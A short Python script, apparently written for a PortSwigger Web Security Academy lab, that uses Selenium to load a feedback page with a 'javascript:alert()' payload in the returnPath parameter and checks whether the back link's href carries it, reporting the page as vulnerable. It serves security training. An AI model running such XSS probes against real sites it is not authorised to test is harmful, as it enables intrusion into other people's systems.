import requests
from selenium import webdriver

driver = webdriver.Edge()
url = "https://0abc001d04ea28f280a6034d00c10058.web-security-academy.net/"
payload = "javascript:alert()"

response = driver.get(url + "feedback?returnPath=" + payload)

link = driver.find_element("id", "backLink")
href = link.get_attribute("href")
if "javascript" in href:
    print("its vulnrable")
